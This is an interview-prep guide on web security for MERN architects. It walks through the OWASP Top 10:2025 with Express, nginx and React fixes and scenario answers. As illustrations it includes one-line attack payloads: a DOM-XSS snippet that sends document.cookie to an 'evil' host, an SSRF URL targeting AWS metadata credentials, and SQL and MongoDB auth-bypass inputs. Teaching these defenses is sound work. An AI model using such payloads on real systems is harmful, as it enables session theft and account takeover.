# Web Security — Architect / Lead Interview Prep (MERN)

> Target: 11+ YoE MERN Lead/Architect. Each topic: what it is → real attack example → how to fix → frontend (JS/React/Next.js) **and** backend (Node.js/nginx/DB) angle. Built to be spoken aloud in an interview, not just memorized.

**Architect-level framing to repeat throughout:** security is **defense-in-depth** (no single control is trusted), **least privilege** (everything gets the minimum access it needs), and **fail closed** (when something breaks, deny rather than allow). Also know *where* each control belongs — browser, CDN/WAF, nginx, app, or DB — and why duplicating or misplacing it causes bugs.

---

## 1. OWASP Top 10 — use the 2025 edition

The list was refreshed: **OWASP Top 10:2025** was announced Nov 2025 and finalized Jan 2026 — the first update since 2021. If you quote 2021 in an architect interview, flag that you know it's superseded. Key structural change: **two new categories** (Supply Chain, Exceptional Conditions), **SSRF folded into Broken Access Control**, and **Security Misconfiguration jumped to #2**.

| 2025 Rank | Category | Change vs 2021 |
|---|---|---|
| A01 | **Broken Access Control** | #1 still; **SSRF absorbed into it** |
| A02 | **Security Misconfiguration** | ▲ up from #5 — config now drives most app behavior |
| A03 | **Software Supply Chain Failures** | **NEW** — expands old "Vulnerable & Outdated Components"; highest exploit/impact scores |
| A04 | **Cryptographic Failures** | ▼ from #2 (root-cause rename of "Sensitive Data Exposure") |
| A05 | **Injection** | ▼ from #3 — ORMs/prepared statements reduced prevalence; XSS lives here |
| A06 | **Insecure Design** | ▼ from #4 |
| A07 | **Authentication Failures** | same #7 (renamed from "Identification & Authentication Failures") |
| A08 | **Software or Data Integrity Failures** | same #8 |
| A09 | **Security Logging & Alerting Failures** | same #9 (renamed: "Monitoring"→"Alerting") |
| A10 | **Mishandling of Exceptional Conditions** | **NEW** — improper error handling, "failing open", logic errors |

> Talking point: the 2025 theme is **root cause over symptom** and **the whole software lifecycle** (build systems, dependencies, config), not just app code. That's exactly the lens an architect is expected to bring.

---

## 2. Access & Authentication

### A01 — Broken Access Control
**What:** a user can act on resources they shouldn't (privilege escalation, IDOR — Insecure Direct Object Reference).
**Real example:** `GET /api/invoices/1043` returns *your* invoice; changing it to `/1044` returns someone else's because the server only checks "are you logged in?", not "do you *own* invoice 1044?". This is the single most common real-world breach class.

**Fixes (backend-owned — never trust the client):**
- Enforce authorization **server-side on every request**, scoped to the resource owner.
- Deny by default; the absence of a rule means "no".
```js
// Express: ownership check, not just authentication
app.get("/api/invoices/:id", requireAuth, async (req, res) => {
  const invoice = await Invoice.findOne({ _id: req.params.id, ownerId: req.user.id });
  if (!invoice) return res.sendStatus(404); // 404 not 403 — don't confirm existence
  res.json(invoice);
});
```
- Use **RBAC/ABAC** centrally (middleware), not scattered `if (user.role === 'admin')` checks.
- Frontend: hiding an admin button is **UX, not security** — the API must reject the action regardless.

### SSRF (now under A01) — Server-Side Request Forgery
**What:** the server is tricked into making requests to internal targets. Classic cloud attack: hit the metadata endpoint to steal credentials.
**Real example:** an image-fetch feature accepts a URL; attacker submits `http://169.254.169.254/latest/meta-data/iam/security-credentials/` to exfiltrate AWS role keys.
**Fixes:**
- Block requests to internal/link-local IP ranges (169.254.0.0/16, 10.0.0.0/8, 127.0.0.0/8, etc.) — validate **after DNS resolution** to defeat rebinding.
- Use **IMDSv2** (requires a session token header) so a naive GET can't read metadata.
- Use a VPC + security groups so the web tier can't reach the metadata service or private DB directly.
- Allowlist destination hosts rather than blocklisting.

### A07 — Authentication Failures
**What:** weak login: credential stuffing, brute force, weak session handling.
**Real example:** attacker takes a leaked `email:password` dump and scripts logins across your site (**credential stuffing**) — most users reuse passwords.
**Fixes:**
- **MFA/2FA**, **rate limiting** + account lockout/backoff, **CAPTCHA** on repeated failures.
- Strong password hashing — **bcrypt/argon2**, never plain or fast hashes (MD5/SHA1).
```js
import bcrypt from "bcrypt";
const hash = await bcrypt.hash(password, 12);     // store hash, never the password
const ok = await bcrypt.compare(input, hash);     // constant-time compare
```
- Standard, audited auth frameworks (Passport, Auth0, Cognito, NextAuth) over hand-rolled.
- Session tokens: rotate on login, invalidate on logout, short-lived access + refresh tokens.

---

## 3. Injection (A05)

### SQL Injection
**What:** untrusted input concatenated into a query changes its meaning.
**Real example:** `"SELECT * FROM users WHERE email='" + input + "'"` with input `' OR '1'='1` returns all rows.
**Fix:** **parameterized queries / prepared statements** (or an ORM that parameterizes). Never string-concatenate.
```js
// pg — parameterized
await pool.query("SELECT * FROM users WHERE email = $1", [email]);
```

### NoSQL / MongoDB Injection — *critical for MERN, your notes miss this*
**What:** MongoDB takes objects as queries, so an attacker submits an **operator object** instead of a string.
**Real example:** login body `{ "email": "a@b.com", "password": { "$gt": "" } }`. If passed straight to `User.findOne(req.body)`, `$gt: ""` matches any password → **auth bypass**.
**Fixes:**
- Cast/validate types — passwords must be **strings**, not objects. Use a schema validator (Zod/Joi) at the edge.
- `express-mongo-sanitize` to strip keys starting with `$` or containing `.`.
- Never spread `req.body` directly into a query.
```js
import { z } from "zod";
const Login = z.object({ email: z.string().email(), password: z.string().min(8) });
const { email, password } = Login.parse(req.body); // throws if password is an object
const user = await User.findOne({ email });        // explicit fields only
```

### Cross-Site Scripting (XSS) — injection into the browser
XSS = attacker runs their JS in your origin, by tricking the page into treating it as first-party code. Three flavors:

- **Reflected:** input echoed back in the response. `?search=<script>alert(1)</script>` reflected into HTML. Server-side trigger via the request.
- **Stored (persistent):** payload saved in DB (e.g. a profile/comment `<script>`), executes for **every** viewer — the most damaging.
- **DOM-based:** client JS writes untrusted input into the DOM unsafely. `site.com?name=<img src=x onerror="fetch('//evil/?c='+document.cookie)">` then `el.innerHTML = params.get('name')`.

**Fixes (layered):**
- **Output encoding / safe DOM APIs:** use `textContent`, not `innerHTML`. React escapes by default — the danger is `dangerouslySetInnerHTML`.
- **Sanitize** any HTML you must render: **DOMPurify**.
```jsx
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userHtml) }} />
```
- **Content-Security-Policy** with a per-request **nonce** (see §6) so injected inline scripts can't run even if they slip through.
- **HttpOnly cookies** so a successful XSS still can't read the session token via `document.cookie`.
- Validate/normalize input server-side as a backstop.

> Architect note: XSS defense is the textbook **defense-in-depth** answer — escaping *and* sanitization *and* CSP *and* HttpOnly. No single layer is trusted.

### Command Injection / ReDoS (round out "injection")
- **Command injection:** never pass user input to `exec`/shell; use `execFile` with an args array, or avoid shelling out.
- **ReDoS (Regex DoS):** a catastrophic-backtracking regex on attacker input pins the event loop and DoSes a Node process (single-threaded!). Avoid nested quantifiers like `(a+)+`; use `re2` or validate length/use safe patterns. Especially dangerous in Node because one blocked regex stalls all requests on that worker.

---

## 4. CSRF — Cross-Site Request Forgery

**What:** the browser **auto-attaches cookies** to requests regardless of who initiated them, so a malicious site can trigger an authenticated action. The browser can't tell a real user action from a forged cross-site one.
**Real example:**
1. User is logged into `mybank.com` (session cookie set).
2. User opens a phishing page.
3. That page auto-submits a hidden form to `mybank.com/transfer` (`document.forms[0].submit()`).
4. Browser attaches the bank cookie → bank thinks it's the user.
> Key fact: **cookies are scoped by destination domain, not by where the request originated** — that's the whole vulnerability.

**Fixes:**
- **`SameSite` cookies** (primary modern defense):
  - `SameSite=Lax` (**recommended**) — sends cookies on top-level GET navigation but **not** on cross-site POST → blocks CSRF with good UX.
  - `SameSite=Strict` — blocks cookies on *any* cross-site navigation; very safe but users look logged out when arriving from an email/Google link.
  - Always pair with `HttpOnly` + `Secure`.
- **Check `Origin` / `Referer`** server-side — `Origin` is more reliable (can't be forged by page JS).
- **SPA pattern — synchronizer token or double-submit:**
  - On load, client fetches a CSRF token (stored server-side in session), holds it (e.g. Redux), and sends it as an `X-CSRF-TOKEN` header. Forged cross-site requests can't read it (same-origin policy), so they can't include it.
- **Re-authenticate** for critical operations (password/email change, payments).
```js
// cookie setup
res.cookie("sid", token, { httpOnly: true, secure: true, sameSite: "lax" });
```

---

## 5. Clickjacking

**What:** your real page is loaded in a hidden/transparent iframe on an attacker site, positioned so a user clicking a decoy ("Download Movie") actually clicks your invisible button ("Delete Account"). The browser sees a legit click from a logged-in user.
**Fixes (tell the browser your page may not be framed by others):**
```nginx
# nginx
add_header X-Frame-Options "DENY" always;
add_header Content-Security-Policy "frame-ancestors 'self'" always;
```
- `frame-ancestors` (CSP) is the modern control; `X-Frame-Options` is the legacy fallback. Set in nginx **or** app, not duplicated.

---

## 6. Security Headers — the consolidation point

Headers are how the browser enforces many of the above. Two ways to set them: **nginx** (static, edge, ops-owned) or **app via Helmet** (dynamic, per-request, in version control). Split by static-vs-dynamic; **never set the same header in both** (duplicate CSP headers make the browser enforce the *intersection* → baffling breakage).

### Helmet defaults (Node, app-level)
`app.use(helmet())` sets a baseline (CSP, HSTS, `X-Content-Type-Options: nosniff`, `X-Frame-Options`, `Referrer-Policy`, COOP/CORP, `X-DNS-Prefetch-Control`, `X-XSS-Protection: 0`, etc.) and **removes `X-Powered-By`** so you stop advertising Express. Note `X-XSS-Protection: 0` is intentional — the legacy browser filter was buggy; rely on CSP instead.

### CSP with a nonce (the strong XSS layer)
A **nonce** = "number used once": a fresh random token generated **per request at runtime** (not build time), placed in the CSP header **and** on each legit `<script>`. The browser runs only scripts whose nonce matches; injected scripts can't guess it → blocked. (Static pages that can't inject per-request use **hashes** instead.)
```js
// security.js
import crypto from "node:crypto";
import helmet from "helmet";
const isProd = process.env.NODE_ENV === "production";

export const cspNonce = (req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString("base64");
  next();
};

export const securityHeaders = () => helmet({
  contentSecurityPolicy: {
    useDefaults: true,
    directives: {
      "default-src": ["'self'"],
      "object-src": ["'none'"],
      "frame-ancestors": ["'self'"],
      "script-src": ["'self'", (req, res) => `'nonce-${res.locals.cspNonce}'`, "https://cdn.jsdelivr.net"],
      ...(isProd ? { "upgrade-insecure-requests": [] } : {}),
    },
  },
  strictTransportSecurity: isProd
    ? { maxAge: 63072000, includeSubDomains: true, preload: true }
    : false, // off in dev so localhost HTTP isn't force-upgraded
  referrerPolicy: { policy: "strict-origin-when-cross-origin" },
});
```
**Rollout tip (say this):** ship CSP in **`Content-Security-Policy-Report-Only`** with a `report-uri` first, collect violations from real traffic, fix legit blocked assets, *then* enforce. Avoids breaking the app.

### HSTS (HTTP Strict Transport Security)
**What:** after the first HTTPS visit, the browser refuses HTTP for `max-age` (defeats MITM/SSL-stripping). First plain-HTTP hit gets a 301→HTTPS, then it's remembered.
**Where:** belongs at the **TLS-terminating layer (nginx)**.
```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
```
- `preload` is near-permanent (baked into browsers) — only add once *every* subdomain is HTTPS-only.

---

## 7. CORS — Cross-Origin Resource Sharing

**What:** the browser's same-origin policy blocks JS from reading cross-origin responses unless the server opts in via CORS headers. Misunderstanding this is a common interview trap.
**Key facts:**
- **Simple requests (no preflight):** `GET`, `HEAD`, `POST` *only* with simple headers and `Content-Type` of `text/plain`, `application/x-www-form-urlencoded`, or `multipart/form-data`.
- Anything else (custom headers like `Authorization`, JSON content-type, `PUT`/`DELETE`) triggers a **preflight `OPTIONS`**.
- CORS is **not a server-side access control** — it controls what *browsers* let JS read. It does **not** protect your API from non-browser clients. Don't conflate it with auth.
**Fix (be explicit, no wildcards with credentials):**
```js
import cors from "cors";
app.use(cors({
  origin: ["https://app.example.com"], // explicit allowlist, never "*" with credentials
  credentials: true,
  methods: ["GET", "POST", "PUT", "DELETE"],
}));
```

---

## 8. Cryptographic Failures (A04)

**What:** sensitive data not protected — plaintext passwords, weak hashing, no TLS, secrets in code.
**Fixes:**
- **Hash** passwords (bcrypt/argon2); **encrypt** sensitive fields at rest; **TLS everywhere** in transit.
- **Never commit secrets** — use env vars / a secrets manager (AWS Secrets Manager, Vault). Rotate keys.
- In Next.js, remember **`NEXT_PUBLIC_*` env vars ship to the browser** — never put secrets there; server-only secrets stay unprefixed and are used only in server code (route handlers, server components, server actions).

---

## 9. Security Misconfiguration (A02 — now #2)

**What:** verbose errors leaking stack traces, default creds (`admin/admin`), unnecessary open ports, public S3 buckets, debug mode in prod, directory listing on.
**Fixes:**
- **Generic error messages** to clients; log details server-side only.
```js
app.use((err, req, res, next) => {
  console.error(err);                 // full detail to logs
  res.status(500).json({ error: "Internal Server Error" }); // generic to client
});
```
- Disable `x-powered-by`, set secure cookie flags, lock down CORS, close unused ports, private-by-default buckets, least-privilege IAM.
- Separate config per env; no debug/stack traces in prod; review cloud defaults.

---

## 10. Insecure Design (A06)

**What:** flaws in architecture/business logic, not a coding bug. Example from your notes: **user-specific promo codes accessible by all** because the design never scoped them. Or: a "transfer" flow with no limit/approval step.
**Fixes:** **threat modeling** during design (STRIDE), abuse-case analysis, secure design patterns, server-side business-rule validation, rate/amount limits baked into the flow. This is the most *architect-flavored* category — expect to be asked to threat-model a feature live.

---

## 11. Software Supply Chain Failures (A03 — new, highest impact)

**What:** compromise via dependencies, build systems, or distribution — not your own code. A malicious npm package, a typosquat, a compromised maintainer pushing a backdoored patch version.
**Why it's nasty:** a brand-new malicious version **isn't a known CVE yet**, so `npm audit`/SAST won't flag it immediately.
**Fixes (layered — say all of these):**
- **Lock versions** (`package-lock.json` committed) and use **`npm ci`** (clean install, exact lockfile versions) in CI — no drift, no surprise installs.
- **Private/internal registry** (JFrog Artifactory, AWS CodeArtifact) as a vetted proxy.
- **Scan continuously:** `npm audit`, Snyk, SonarQube — and runtime detection (Datadog/Sentry/New Relic) for unexpected outbound calls.
- **`npm ci --ignore-scripts`** to neutralize malicious lifecycle (post-install) scripts.
- **Build in containers** for isolation:
  - *Isolation:* malicious package sees a sandbox, not your SSH keys/host.
  - *Ephemeral:* kill the container, kill the threat — no persistence.
  - *Minimal surface:* `node:alpine`/`slim` → fewer packages, fewer holes.
  - *Least privilege:* `USER app`, never root.
```dockerfile
FROM node:20-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --ignore-scripts      # exact lockfile versions, no lifecycle scripts
COPY . .
RUN npm run build
USER node                         # drop root
CMD ["node", "server.js"]
```

---

## 12. Software/Data Integrity Failures (A08)

**What:** trusting unverified code/data — **insecure deserialization**, auto-updates from untrusted sources, unsigned artifacts. Can lead to RCE.
**Fixes:** verify integrity (signatures, checksums, SRI for CDN scripts), lock CI/CD with strong access controls and signed commits/artifacts, don't deserialize untrusted data into live objects.
```html
<!-- Subresource Integrity: browser refuses the script if the hash doesn't match -->
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-..." crossorigin="anonymous"></script>
```

---

## 13. Logging & Alerting Failures (A09)

**What:** breaches go undetected because nothing is logged **or** logs exist but nobody is alerted. The 2025 rename stresses **alerting** — logging without alerting is near-useless.
**Fixes:** centralized structured logging (don't log secrets/PII/tokens), alerts on auth failures spikes, privilege changes, anomalous traffic; tools like Datadog/Sentry/New Relic; tamper-evident audit trails for sensitive actions.

---

## 14. Mishandling of Exceptional Conditions (A10 — new)

**What:** improper error handling, logic errors, and **"failing open"** — when something breaks, the system *allows* instead of *denying*. Example: an auth check that throws and a `catch` that proceeds as if authorized.
**Fixes:** **fail closed** (errors → deny), handle every promise rejection/exception, no silent catches, validate state transitions, never expose internals in error responses. In Node, an unhandled rejection can crash a worker — handle them and exit cleanly under a process manager.
```js
// fail CLOSED, not open
try {
  const allowed = await authorize(user, resource);
  if (!allowed) return res.sendStatus(403);
} catch (e) {
  console.error(e);
  return res.sendStatus(403); // deny on error — do NOT fall through to allow
}
```

---

## 15. Frontend security (JS / React / Next.js)

- **React escapes by default** — XSS risk concentrates in `dangerouslySetInnerHTML` (sanitize with DOMPurify), `href`/`src` from user input (block `javascript:` URIs), and `eval`/`new Function`.
- **Never store sensitive data in `localStorage`** — it's readable by any JS, so XSS = token theft. Prefer **HttpOnly cookies** for session tokens. (localStorage is fine for non-sensitive UI state.)
- **Next.js specifics:**
  - `NEXT_PUBLIC_*` env vars are **bundled into client JS** — secrets must be server-only (unprefixed), used in route handlers / server components / server actions.
  - **Server Actions / route handlers still need authz** — being "server-side" doesn't authorize the caller; check the session every time.
  - Set security headers via `next.config.js` `headers()` **or** nginx — pick one owner.
  - Validate inputs on the server even when the client validated them (client validation is UX only).
- **DOM-based XSS:** prefer `textContent` over `innerHTML`; treat all URL params/`postMessage` data as untrusted.
- **CSRF for SPAs:** SameSite cookies + synchronizer/double-submit token in a header.
- **SRI** for any third-party `<script>` you load.

---

## 16. Backend security (Node.js / nginx / MongoDB)

**Node/Express**
- `helmet`, explicit `cors`, body-size limits (`express.json({ limit: "100kb" })`), **rate limiting** (`express-rate-limit`) to blunt brute force/credential stuffing.
- Validate every input at the edge (Zod/Joi); never spread `req.body` into queries.
- Centralized error handler → generic client messages; **fail closed**.
- `app.set("trust proxy", 1)` behind a load balancer so `req.secure`/HSTS/rate-limit-by-IP work.

**MongoDB / Mongoose**
- **Type-validate** to prevent operator-injection (`$gt`, `$ne`); use schemas with `strict` mode.
- Least-privilege DB users (app user can't drop collections); separate read/write roles.
- Don't expose `_id` enumeration without ownership checks (IDOR).
- TLS to the DB; never a public-internet-exposed Mongo with default creds (a classic ransomware vector).
- Disable server-side JS (`$where`, `mapReduce`) unless required.

**nginx (edge)**
- TLS termination + **HSTS**, static security headers, request size limits (`client_max_body_size`), basic rate limiting (`limit_req`), hide version (`server_tokens off`), close unused ports.
- A **WAF** in front (Cloudflare/AWS WAF) for OWASP rule coverage and bot/rate management.

```nginx
server {
  server_tokens off;                       # don't leak nginx version
  client_max_body_size 1m;                 # cap body size
  add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
  add_header X-Content-Type-Options "nosniff" always;
  add_header X-Frame-Options "DENY" always;
  add_header Referrer-Policy "strict-origin-when-cross-origin" always;
  # CSP stays in the app (needs per-request nonce) — don't double-set it here.
  limit_req zone=api burst=20 nodelay;     # rate limit
}
```

---

## 17. Cross-cutting architect checklist (defense-in-depth map)

| Layer | Owns |
|---|---|
| **Browser** | CSP, SameSite cookies, SRI, same-origin policy |
| **CDN / WAF** | OWASP rules, DDoS/bot mitigation, rate limiting |
| **nginx (edge)** | TLS+HSTS, static headers, body/connection limits, port hygiene |
| **App (Node)** | AuthN/AuthZ, input validation, CSP nonce, output encoding, error handling (fail closed), rate limiting |
| **DB (Mongo)** | Least-privilege users, TLS, no operator injection, no public exposure |
| **CI/CD & supply chain** | `npm ci`, lockfile, signed artifacts, container isolation, least privilege |
| **Observability** | Structured logs (no secrets), alerting on anomalies, audit trails |

**Three sentences to anchor any answer:** enforce server-side and **never trust the client**; apply **multiple independent layers** so one failure isn't fatal; and **fail closed**, deny by default, least privilege everywhere.

---

## 18. Likely interview questions (rehearse out loud)

- Walk me through what happens, end-to-end, when a stored XSS payload lands — and every layer that should stop it.
- Where do you set security headers — nginx or the app — and why? (Answer: static→nginx, per-request CSP nonce→app, never both.)
- How is NoSQL injection different from SQL injection in a MERN stack, and how do you prevent it?
- CSRF vs XSS — how do the attacks differ and why do their defenses differ? (Cookies-auto-attached vs script-execution; SameSite/tokens vs CSP/encoding.)
- A dependency you use just shipped a malicious patch version. How does your pipeline limit the blast radius? (lockfile + `npm ci --ignore-scripts` + private registry + container isolation + runtime alerting.)
- Threat-model this feature live: "users can share a document by link." (Insecure design / broken access control territory.)
- Why is CORS *not* an authentication mechanism?
- What does "fail closed" mean and where have you applied it?

---

## 19. Scenario-based questions (with model answers)

These are the "tell me about a time / what would you do if" questions that separate a senior from a lead. Each answer follows the same shape interviewers reward: **diagnose → contain → fix the root cause → prevent recurrence**, while naming the *layer* and the *tradeoff*. Speak them as a story, not a definition dump.

### Scenario 1 — "Users report their accounts are being taken over, but your logs show successful logins with correct passwords. What's happening and what do you do?"

**Diagnosis:** Correct-password logins from unusual IPs/geographies is the signature of **credential stuffing** — attackers replaying email/password pairs from a third-party breach. It's not *your* password store leaking; it's password reuse.

**Immediate containment:**
- Force-reset affected sessions; invalidate refresh tokens for flagged accounts.
- Add velocity-based blocking (many distinct accounts from one IP, many IPs against one account).

**Root-cause fixes:**
- **Rate limiting + exponential backoff + lockout** on the login route.
- **MFA** — the single highest-leverage control; even valid stolen passwords fail without the second factor.
- **CAPTCHA** triggered after N failures (not on every login — UX).
- Check submitted passwords against a **breached-password list** (e.g. HaveIBeenPwned k-anonymity API) at signup/reset.

```js
import rateLimit from "express-rate-limit";
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,                          // per IP per window
  standardHeaders: true,
  skipSuccessfulRequests: true,    // only count failed attempts
});
app.post("/login", loginLimiter, loginHandler);
```
**Prevention / detection:** alert on login-failure spikes and impossible-travel logins (ties to A09 logging & alerting). **Tradeoff to name:** rate limiting by IP hurts users behind shared NAT/corporate proxies — so combine IP + account + device signals rather than IP alone.

---

### Scenario 2 — "A penetration tester changed the ID in `GET /api/orders/8842` to `8843` and saw another customer's order. How did this happen and how do you fix it across the codebase?"

**Diagnosis:** Classic **IDOR / Broken Access Control (A01)** — the endpoint authenticates ("are you logged in?") but doesn't authorize ("do you *own* this order?").

**Fix (the specific bug):** scope every query by owner, and return **404 not 403** so you don't even confirm the record exists.
```js
const order = await Order.findOne({ _id: req.params.id, ownerId: req.user.id });
if (!order) return res.sendStatus(404);
```

**Fix (across the codebase — the architect answer):** a one-off patch isn't enough; the *pattern* is the problem.
- Centralize authorization in **middleware/policy layer** so ownership checks aren't copy-pasted per route (and forgotten).
- Adopt **non-enumerable IDs** (UU/ULID) so guessing is harder — defense-in-depth, not a substitute for authz.
- Add an **automated test** that hits every resource endpoint as user B with user A's IDs and asserts 404 — turn the pentest finding into a regression gate.
- Audit for the same pattern everywhere `req.params.id` / `req.body.id` flows into a query without an owner scope.

**Tradeoff:** central policy enforcement adds indirection; the payoff is you can't *forget* a check, which is exactly how IDOR recurs.

---

### Scenario 3 — "Marketing added a third-party analytics script and now the browser console is full of CSP violations and the app's own scripts stopped loading. Walk me through resolving it without just disabling CSP."

**Diagnosis:** The new script's domain isn't in `script-src`, and "scripts stopped loading" suggests someone tried to fix it by editing CSP and broke the nonce/allowlist, or the analytics vendor injects further inline scripts.

**What I would *not* do:** add `'unsafe-inline'` or remove CSP. That throws away the XSS protection to fix a config issue.

**Resolution path:**
1. Switch to **`Content-Security-Policy-Report-Only`** temporarily with a `report-uri`/`report-to` endpoint so the app works while I collect *exactly* which directives/domains are violated from real traffic.
2. Add the vendor's specific domains to the right directives (`script-src`, `connect-src`, `img-src` for beacons).
3. If the vendor needs inline execution, use a **nonce** or **hash** for their snippet — not a blanket `'unsafe-inline'`.
4. Re-enable enforcing mode once report-only is clean.

**Architect point:** every third-party script is also a **supply-chain risk (A03)** — it runs in your origin. Push back on adding analytics that demand `'unsafe-inline'`, prefer ones supporting nonce/SRI, and consider a tag manager with a tight CSP rather than raw vendor scripts. **Tradeoff:** report-only delays enforcement by a few days, but shipping a broken app or a gutted CSP is worse.

---

### Scenario 4 — "Your Express API behind nginx/ALB applies `express-rate-limit`, but one IP is still hammering it past the limit and HSTS/secure-cookie logic is misbehaving. What's wrong?"

**Diagnosis:** Behind a proxy, every request arrives with the **proxy's IP** as `req.ip`, so rate-limiting buckets everyone together (or fails to isolate the attacker), and `req.secure` is `false` because Express doesn't see the original TLS — breaking `Secure` cookies and HSTS conditionals.

**Fix:**
```js
app.set("trust proxy", 1);   // trust the first proxy hop; now req.ip = X-Forwarded-For client IP
```
- With `trust proxy` set, `express-rate-limit` keys on the real client IP and `req.secure` reflects the original HTTPS.
- **Security caveat to mention:** don't set `trust proxy: true` (trust all) blindly — a client can spoof `X-Forwarded-For` if untrusted hops exist. Trust the *exact* number of proxies in front of you.

**Defense-in-depth:** also rate-limit at the **edge** (nginx `limit_req` or WAF) so abusive traffic never reaches Node — the app limiter is a backstop, not the front line.

---

### Scenario 5 — "A login endpoint accepts JSON `{ email, password }`. A tester sends `{ "email": "admin@x.com", "password": { "$gt": "" } }` and logs in as admin. Explain and fix."

**Diagnosis:** **NoSQL operator injection (A05).** The body was passed into `User.findOne(req.body)`; `{ $gt: "" }` is a MongoDB operator that matches any non-empty password hash → **auth bypass**. The root cause is trusting that `password` is a string.

**Fix (primary):** validate types at the edge so an object can never reach the query.
```js
import { z } from "zod";
const Login = z.object({
  email: z.string().email(),
  password: z.string().min(8),   // an object fails parse() → 400
});
const { email, password } = Login.parse(req.body);
const user = await User.findOne({ email });            // explicit field, never req.body
if (!user || !(await bcrypt.compare(password, user.hash))) return res.sendStatus(401);
```

**Fix (defense-in-depth):** `express-mongo-sanitize` to strip `$`/`.` keys globally, Mongoose schema typing, and never spread `req.body` into a query anywhere. **Architect point:** this is why "validate at the boundary" is a standard, not a nicety — the same class of bug appears in search filters, sort params, and aggregation pipelines, not just login.

---

### Scenario 6 — "At 2 AM, a transitive npm dependency publishes a patch version that exfiltrates env vars during `npm install`. Your CI auto-updates. How does your setup limit the damage, and what do you change?"

**Diagnosis:** A **software supply-chain attack (A03)** via a malicious lifecycle (post-install) script. A brand-new version isn't a known CVE, so `npm audit` won't catch it in time.

**What limits the blast radius (if set up right):**
- **`package-lock.json` committed + `npm ci`** — CI installs *exact* locked versions, so a surprise new version isn't pulled unless the lockfile changed in a reviewed PR.
- **`npm ci --ignore-scripts`** — neutralizes the malicious post-install hook entirely.
- **Build in an ephemeral container as non-root** — the script sees a sandbox, not real secrets/SSH keys, and the container dies after the build.
- **Private registry (Artifactory/CodeArtifact)** with a quarantine/approval window for new versions.

**What I'd change after the incident:**
- Pin/freeze dependencies and require human review for version bumps (Renovate/Dependabot PRs, not auto-merge).
- Scope CI secrets so the build stage has **no** access to production credentials (least privilege).
- Runtime egress monitoring (Datadog/Sentry) to alert on unexpected outbound connections from build or runtime.

```dockerfile
RUN npm ci --ignore-scripts    # exact lockfile versions + no lifecycle scripts
USER node                      # not root
```
**Tradeoff:** `--ignore-scripts` can break packages that legitimately need a build step (e.g. native modules) — allowlist those explicitly rather than enabling scripts globally.

---

### Scenario 7 — "Your SPA on `app.example.com` calls the API on `api.example.com`. You use cookie auth. A security review flags CSRF risk. How do you secure it, and why isn't CORS enough?"

**Diagnosis:** Cookie auth means the browser **auto-attaches** the session cookie cross-site, so a malicious page can trigger state-changing requests — **CSRF**. CORS does **not** prevent this: CORS controls whether JS can *read* the response, but the request (and its cookies) still *reaches* your server and the side effect still happens. CORS is not an auth/CSRF control.

**Fix:**
- **`SameSite=Lax`** (or `Strict` for high-value flows) + `HttpOnly` + `Secure` cookies — blocks cookies on cross-site POST, killing the common CSRF vector with good UX.
- For cross-subdomain SPA→API, add a **double-submit / synchronizer CSRF token** sent as `X-CSRF-TOKEN`; a cross-site attacker can't read it (same-origin policy) so can't forge it.
- **Verify `Origin`** header server-side on state-changing requests (`Origin` can't be spoofed by page JS).

```js
res.cookie("sid", token, { httpOnly: true, secure: true, sameSite: "lax" });
// reject state-changing requests whose Origin isn't allowlisted
```
**Tradeoff to name:** `SameSite=Strict` is safest but logs users out when they arrive from external links/emails — `Lax` is the usual balance. **Alternative architecture:** token-in-`Authorization`-header auth (not cookies) sidesteps CSRF entirely, but then you own XSS-driven token theft risk — which is why such tokens must never live in `localStorage`. Every choice trades one risk for another; saying that out loud is the senior signal.

---

### Scenario 8 — "Under load, your auth service's dependency (a permissions API) times out. You notice requests are succeeding anyway. Is that good?"

**Diagnosis:** **No — that's failing open (A10, Mishandling of Exceptional Conditions).** When the permissions check errors/times out, a `catch` is letting the request through as authorized. Under load or a targeted outage, this becomes an authorization bypass.

**Fix — fail closed:**
```js
try {
  const allowed = await permissionsApi.check(user, resource); // may time out
  if (!allowed) return res.sendStatus(403);
} catch (e) {
  logger.error({ e }, "authz check failed");
  return res.sendStatus(403);   // deny on error — never fall through to allow
}
```
**Architect nuance:** "fail closed" can cause an availability hit if the permissions service is flaky — so address the *real* problem too: a short cache of authz decisions, a circuit breaker, sane timeouts, and a degraded-mode policy that's still safe (deny writes, allow read of already-authorized data). **Tradeoff:** security vs availability — but for an *authorization* decision, denying is the correct default; you don't trade away access control to stay up.

---

### Scenario 9 — "A bug report says an error page is showing a full stack trace including a DB connection string in production. Triage this."

**Diagnosis:** **Security Misconfiguration (A02)** — verbose errors leaking internals (here, a secret). Two problems: the error handler isn't sanitizing output, *and* a connection string with credentials is in an error object at all.

**Immediate:** ship a generic error handler; rotate the exposed DB credential (assume it's compromised).
```js
app.use((err, req, res, next) => {
  logger.error({ err, reqId: req.id });        // full detail to logs only
  res.status(500).json({ error: "Internal Server Error", reqId: req.id });
});
```
**Root cause / prevention:** `NODE_ENV=production` (frameworks suppress stack traces), secrets in a secrets manager (not in connection objects that get serialized), a correlation ID returned to users for support instead of internals, and a test asserting prod responses never contain stack frames. **Tie-in:** this also touches A04 (the leaked credential) and A09 (you should *alert* on 5xx spikes, not discover this via a user report).

---

### How to deliver these in the room

For any scenario, structure the answer as: **(1) name the vulnerability class + OWASP category**, **(2) explain the root cause in one sentence**, **(3) immediate containment**, **(4) the real fix, with the layer it lives in**, **(5) how you prevent recurrence (test/alert/policy)**, and **(6) one honest tradeoff**. Interviewers at lead level are listening for the tradeoff and the "across the codebase, not just this bug" instinct — that's what distinguishes an architect from a strong senior.

---

*Sources: OWASP Top 10:2025 (owasp.org, finalized Jan 2026); your notes (XSS/CSRF/HSTS/clickjacking/supply-chain), expanded with MERN-specific production examples. Verify exact library option names against your installed versions (Helmet 8.x, etc.).*